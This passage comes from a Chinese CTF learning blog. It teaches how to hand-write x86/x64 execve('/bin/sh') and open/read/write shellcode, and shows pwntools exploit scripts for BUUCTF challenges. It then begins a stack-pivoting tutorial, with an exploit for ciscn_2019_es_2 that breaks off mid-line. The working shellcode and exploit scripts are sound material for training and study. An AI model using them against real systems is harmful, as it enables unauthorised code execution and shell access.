<p>   ①因为程序本来是没有这个 execve 函数的，但现在要凭空给它造一个，因此这里系统调用 execve（你可以理解为，执行 syscall 指令之前将 rax 装成对应的系统调用号，就可以执行对应的系统调用。</p>
<p>   ②将第一个参数控制为字符串 &#x2F;bin&#x2F;sh</p>
<p>   ③将第二个、第三个参数存入0</p>
</blockquote>
<p><strong>我们要做的是在系统调用 <code>execve</code> 之前，把需要的参数都存到对应的寄存器里。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br></pre></td></tr></table></figure>



<p>上面的代码是要把 <code>rsi</code> <code>rdx</code> 两个寄存器都存成 <code>0</code>，至于这里为什么不用 <code>mov rdx,0</code> 和 <code>mov rsi,0</code> 主要原因有两个</p>
<ol>
<li>避免出现 <code>\x00</code> 字符来截断，当然了 <code>\x00</code> 并不是所有情况都会截断函数，只有用 <code>strcpy</code> 这类函数时才会考虑 <code>\x00</code> 截断，具体截断的话，可以参考下面两张图片</li>
<li><code>xor rsi,rsi</code> 比 <code>mov rsi,0</code> 所需的字节数更少</li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310031702450.png" alt="image-20231003170202299"></p>
<p>图片出自<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">Clang裁缝店</a></p>
<p>接着是将第一个参数存入 <code>rdi</code>，以前我一直以为是 <code>rdi</code> 写成 <code>/bin/sh</code> 对应的 <code>ascii</code> 码，可是踩坑后才明白，<font color=red>我们只是要把&#x2F;bin&#x2F;sh对应的ascii码的 <strong>地址</strong> 给rdi即可</font>  传参的时候，要调用的函数会自己去这个地址里找到对应的&#x2F;bin&#x2F;sh。</p>
<p>因此这步要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f </span><br><span class="line"></span><br><span class="line">push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]    </span><br></pre></td></tr></table></figure>

<p>现在也才是我们要的效果，<font color=red>rdi里面装的是&#x2F;bin&#x2F;&#x2F;sh的地址，而非参数本身</font>。</p>
<p>这里有两点需要注意：</p>
<p>①这个 <code>0x68732f2f6e69622f</code> 是 <code>/bin//sh</code> 对应的 <code>ascii</code> 码。<strong>并且他是倒着存的</strong>，因为 <code>asm</code> 在把我们写的<strong>汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来</strong>。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数 <code>/bin//sh</code> ，而非 <code>hs//nib/</code></u> 。</p>
<p>②**<code>0x68732f2f6e69622f</code> 中间这里出现了两 <code>2f</code> (也就是两个 <code>/</code> )，因为这里要填充够八个字节（<code>64</code> 位程序中，一个内存单元就只能装八个字节）**</p>
<p>为了达到上述的效果，我们还可以这么写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>

<p>有好几处内容都变了。</p>
<p>首先是原本的 <code>push rdi</code> 没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个 <code>\x00</code>来去截断字符串，但是此刻你还会发现 <code>0x68732f6e69622f</code> 中间的两个 <code>2f</code> 现在就变成了一个 <code>2f</code>（此时参数是 <code>/bin/sh</code>） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font></p>
<p><strong>因此我们不但不需要push一个0，并且还不用去填充八字节，程序帮我们补的00，正好可以去代替原本应该push的0。（值得一提的是如果我们内存单元只有六个字节，那么程序依然会帮我们补全到八个字节，也就是填充两个字节的00）</strong></p>
<p>最后的变化就是把原本的 <code>lea rdi,[rsp]</code> 换成了一个 <code>push rsp ;pop rdi</code> 这样做的好处是什么？这样写的字节更少，原本 <code>lea rdi,[rsp]</code> 是四个字节<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203064.png" alt="image-20230926230632118"></p>
<p>即使换成 <code>mov rdi,rsp</code><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203570.png" alt="image-20230926230643732"></p>
<p>也还是三个字节。但是我们为了达到同样的效果，使用 <code>push rsp;pop rdi</code> 两个指令，一共也才两个字节。<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203055.png" alt="image-20230926230657025"></p>
<p>因为很多有难度的题目都会限制 <code>shellcode</code> 的长度，所以所选的 <code>shellcode</code>是越短越好。</p>
<p>最后将 <code>execve</code> 对应的系统调用号放入 <code>rax</code> 中，执行 <code>syscall</code> 即可</p>
<p>那剩下的汇编就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<p>然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了 <code>0x12</code> 个字节。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271209386.png" alt="image-20230926230734484"></p>
<p>此时只要执行这个 <code>shellcode</code> 就可以去拿到 <code>shell</code> 了</p>
<p><strong>注意:</strong> 由于压入参数 <code>/bin/sh</code> 的时候最后一个默认补了 <code>\x00</code>，导致碰见 <code>strcpy</code> 等函数 <code>shellcode</code> 会被截断，这里可以用 <code>/bin//sh</code> 来代替，更新过的 <code>shellcode</code> 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<p>这里拿一道 BUUCTF 上的 mrctf2020_shellcode 来演示一下</p>
<p>使用 <code>IDA</code> 分析之后（这道题无法 <code>F5</code> ，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们 <code>64</code> 位汇编编写 <code>shellcode</code> 的能力。利用 <code>pwntools</code> 中的 <code>asm</code> 把刚才写好的汇编内容转换成机器码，然后发送过去即可获取 <code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="3、怎么用汇编语言构造简单的shellcode（32位）"><a href="#3、怎么用汇编语言构造简单的shellcode（32位）" class="headerlink" title="3、怎么用汇编语言构造简单的shellcode（32位）"></a>3、怎么用汇编语言构造简单的shellcode（32位）</h1><p>前置知识：</p>
<p>①对于 <code>32</code> 位程序而言，我们最后系统调用采用的并不是 <code>syscall</code>，而是 <code>int 0x80</code></p>
<p>②我们传参的前三个寄存器分别是 <code>ebx</code> <code>ecx</code> <code>edx</code></p>
<p>③<code>32</code> 位的 <code>execve</code> 系统调用号是 <code>11</code> ，并且存储系统调用后的寄存器是 <code>eax</code>。<code>32</code> 位的系统调用号可以查看这个文件 <code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code></p>
<p>然后剩下的思路是和 <code>64</code> 位汇编构造 <code>shellcode</code> 的思路是一样的。</p>
<p>首先是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br></pre></td></tr></table></figure>

<p>清空两个参数为0的寄存器</p>
<p>然后是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure>

<p>此时把参数&#x2F;bin&#x2F;sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是&#x2F;bin&#x2F;sh的地址。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210184.png" alt="image-20230926230802945"></p>
<p>此时栈中的情况就是这样，&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;&#x2F;sh的效果一样，至于为什么要存入字符串的时候，要反着写，在64位汇编编写shellcode的时候，已经解释过了，这里就不再重复。</p>
<p>最后是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>现在是把系统调用号存进去并且进行了系统调用</p>
<p>最后把这三部分结合一下效果如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="4、手写open，read，write的shellcode"><a href="#4、手写open，read，write的shellcode" class="headerlink" title="4、手写open，read，write的shellcode"></a>4、手写open，read，write的shellcode</h1><p>遇见 <code>pwn</code> 题开启了沙箱保护的话，如果禁用了 <code>execve</code> <code>system</code> 函数，但没有开启 <code>NX</code> 保护的话，可以采用 <code>orw</code> 的方式来读出 <code>flag</code></p>
<p>首先我们要执行的如下的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>

<p>接下来，就开始用汇编来实现上面的内容(先写 <code>64</code> 位的)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span><br><span class="line">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span><br><span class="line">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span><br><span class="line">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span><br><span class="line">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来是 <code>32</code> 位的 <code>shellcode</code>，<code>32</code> 位和 <code>64</code> 位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（ <code>64</code> 位不需要 <code>push 0</code> 的原因是存入的 <code>flag</code> 不足 <code>8</code> 字节，会自动添加 <code>\x00</code> 来截断）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="5、如何调试或测试写好的汇编代码？"><a href="#5、如何调试或测试写好的汇编代码？" class="headerlink" title="5、如何调试或测试写好的汇编代码？"></a>5、如何调试或测试写好的汇编代码？</h1><p>因为在编写 <code>shellcode</code> 的时候并不是一帆风顺的，如果出现了错误只靠眼睛检查的话 效果不大，因此我们可以把汇编代码编译为可执行文件，用<code>gdb</code> 来调试。</p>
<p>先用 <code>touch shellcode.asm</code>  命令创建一个 <code>shellcode.asm</code> 文件(<code>asm</code> 文件是使用汇编语言编写的源代码文件)</p>
<p>然后 <code>vim shellcode.asm</code> 去编辑这个文件</p>
<p>将汇编的内容写入这个文件里面</p>
<p>（同时在文件的开头写上下面三行的内容，其作用可以自行参考<a href="https://www.cnblogs.com/lazypigwhy/articles/14112041.html">【转】linux汇编.section .text .data 与.global - 比较懒 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br></pre></td></tr></table></figure>

<p>最后的写入的内容应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<p>然后用 <code>nasm -f elf64 shellcode.asm</code> 这个命令去编译刚才写的那个文件（会生成一个 .o 文件）</p>
<p>再用 <code>objdump -d shellcode.o</code> （直接查看的话，是 <code>AT&amp;T</code> 语法的汇编，如果想看 <code>intel</code> 语法的话加上 <code>-M intel</code> 参数即可）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210300.png" alt="image-20230926230942070"></p>
<p>此时就获取到了汇编指令的机器码。</p>
<p>不过由于目前生成的仅仅是 .o 文件，没有被链接过，还无法执行或者调试。因此我们需要链接一下。</p>
<p>输入命令 <code>ld -s -o shellcode shellcode.o</code> 即可</p>
<p>此时执行生成的 <code>shellcode</code> 就成功了（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210448.png" alt="image-20230926231037233"></p>
<p>如果想调试的话，直接 <code>gdb</code> 挂上，然后 <code>start</code> 就可以开始调试我们写的 <code>shellcode</code> 了（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271211378.png" alt="image-20230926231129870"><br><strong>补充：推荐一个在线汇编指令转机器码的网站  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>shellcode编写</tag>
      </tags>
  </entry>
  <entry>
    <title>关于栈迁移的学习总结</title>
    <url>/posts/ee1dcd7f.html</url>
    <content><![CDATA[<h1 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h1><p>  这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是换个地方控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面，又或者是堆里面）。</p>
<span id="more"></span>

<h1 id="2、为什么要使用栈迁移-amp-amp-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-amp-amp-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h1><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p>使用栈迁移的条件：</p>
<p>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp</p>
<p>2、需要有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</p>
<h1 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h1><pre><code>①需要掌握汇编基础
②较为熟悉栈结构
③以及明白函数调用与结束时栈的变化
</code></pre>
<p>PS：本文讨论的一切原理，都是针对于32位程序的栈迁移来说的，不过例题里面有一道是64位的栈迁移</p>
<h1 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h1><h3 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）"></a><font color=red>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）</font></h3><p><img src="/../img/2706180-20220118102346730-1500206355.png"></p>
<p>ebp是0xffe7a9e8，它的内容是0xffe7aa38，而这个内容也是一个地址，这个地址里面装的又是0x8059b50。<u>ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）</u>。我这里想强调的是ebp和ebp的内容这两者一定不能混为一谈，在阅读下面的内容是，一定要注意区分两者。</p>
<h2 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h2><h3 id="在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。"><a href="#在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。" class="headerlink" title="(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。"></a>(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。</h3><p>leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp<font color=red>（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）</font>。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图。<font color=red><strong>ps:下面几张图片，当时制作的时候，有点粗心，把leave写成level了，因此读的时候注意下这里就好了。</strong></font></p>
<p><img src="/../img/2706180-20220118102443458-1381923387.png"></p>
<pre><code>ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图。
</code></pre>
<p><img src="/../img/2706180-20220118102755803-79970067.png"></p>
<h2 id="栈迁移原理："><a href="#栈迁移原理：" class="headerlink" title="栈迁移原理："></a>栈迁移原理：</h2><p><strong>（先讨论main函数里的栈迁移）</strong>首先<strong>利用溢出把ebp的内容</strong>给修改掉（<strong>修改成我们要迁移的那个地址</strong>），并且<strong>把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）</strong>（如果不会找指令地址的话，本文最后的附录中，有介绍）此时main函数准备结束。</p>
<p><font color=red>开始执行第一个leave</font>，此时mov esp ebp让两个指针处于同一位置，现在还是正常运行，接着执行pop ebp就出现了异常，<u>因为此时ebp的内容被修改成了要迁移的地址</u>，因此执行了pop ebp，ebp并没有弹到它本应该去的地方（正常情况下，ebp里装的内容，就是它接下来执行pop ebp要去的地方），<u>而是弹到了我们修改的那个迁移后的地址</u>，接着执行了pop eip，eip里放的又是leave的地址（因为此时是把返回地址弹给eip，这个返回地址，我们先给覆盖成leave;ret的地址。<font color=red>你可能会问，如果这个返回地址不放成leave；ret的地址，行不行？很明显是不行的，因为我们想要实现栈迁移，就必须执行两个leave；ret，main函数正常结束，只有一个level;ret，因此我们在这里必须要它的返回地址写成leave;ret地址，以来进行第二次leave;ret</font>），结果又执行了leave<font color=red>（现在执行第二个leave)</font>，此时才是到了栈迁移的核心部分，<strong>mov esp ebp，ebp赋给了esp，此时esp挪到了ebp的位置，可你别忘了，现在的ebp已经被修改到了我们迁移后的地址，因此现在esp也到了迁移后的地址，接着pop ebp，把这个栈顶的内容弹给ebp，esp指向了下一个内存单元，此时我们只需要将这个内存单元放入system函数的地址，最后执行了pop eip，此时system函数进入了eip中，我们就可以成功GetShell了</strong>。结合描述过程与下图分析，效果更佳！（下图栈中填充的aaaa以及system_addr和&#x2F;bin&#x2F;sh等等，都是payload一起发送过去的，最后的两个aaaa仅仅是起到了一个填充的效果）当然，具体的payload都是根据题目来分析的，这里我只是举个例子。</p>
<p><img src="/../img/2706180-20220118102850680-2070302005.png"></p>
<p><img src="/../img/2706180-20220118103002284-1311363088.png"></p>
<p>最后来总结一下原理，核心是利用两次的leave;ret，<strong>第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）</strong>，<strong>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是system函数的plt地址）</strong>，最终成功GetShell。</p>
<p>原理如上，遇见不同栈迁移的题目也是根本核心万变不离其宗。</p>
<h1 id="5、栈迁移的实战运用"><a href="#5、栈迁移的实战运用" class="headerlink" title="5、栈迁移的实战运用"></a>5、栈迁移的实战运用</h1><p>接下来是有四道栈迁移的题目来练习。分别是</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p>它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。在这里，我分别也给出他们的wp。</p>
<hr>
<h2 id="BUUCTF上的ciscn-2019-es-2"><a href="#BUUCTF上的ciscn-2019-es-2" class="headerlink" title="BUUCTF上的ciscn_2019_es_2"></a>BUUCTF上的ciscn_2019_es_2</h2><p><img src="/../img/2706180-20220118103554143-806908519.jpg"><img src="/../img/2706180-20220118103707874-2116954617.jpg"></p>
<p>这里我们发现了溢出点。Read读入到s的这个地方，距离ebp只有0x28个字节，可是两个read都可以写入0x30个字节的内容，也就是说可以溢出覆盖ebp和返回地址。</p>
<p><img src="/../img/2706180-20220118103715766-1605737103.png"></p>
<p>我们还发现了后门函数，但是没有参数。</p>
<p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p>
<p>那现在大概思路就是，我们要用第一个read来泄露下ebp的地址***（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x30个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了***），然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），参数分布参考上图</p>
<p>为什么要拿到ebp地址呢，看上图的&#x2F;bin&#x2F;sh地址，我们怎么知道它的地址是什么呢，我们不知道，但是我们知道它距离ebp的偏移（通过IDA的栈图可以数出来），因此我们需要获得ebp的值，配合偏移来表达出这个地址，***这里要尤其注意这个ebp是main函数的，因为printf是打印内存单元里的内容，ebp确实是指向了vul的栈底，但是ebp里面装的内容可是main函数的栈底，因此这个ebp是main函数的栈底***。至于这个0x28怎么来的呢？</p>
<p>这里要用gdb调试一下，断点下到哪无所谓，主要就是要看vul函数快结束的时候，看下栈图。</p>
<p><img src="/../img/2706180-20220118120659280-353618504.jpg"></p>
<p>当然，你实际做题的时候，肯定是看不见&#x2F;bin&#x2F;sh装到哪了，不过没事，在IDA里面我们分析一下，然后看一下它装在哪了，还是这个图，发现&#x2F;bin&#x2F;sh装在了距离栈顶是有四个内存单元的距离，然后再到gdb上去数一下，也就是我们的字符串会存到0xffd9d730这个位置，然后用0xffded758减去这个0xffd9d730，就能得到这个偏移0x28了。</p>
<p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25986)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+<span class="number">0x8</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">level_ret_addr=<span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)<span class="comment">#第一次仅仅就是为了泄露main函数的ebp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xffd9d730</span>)+<span class="string">&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span 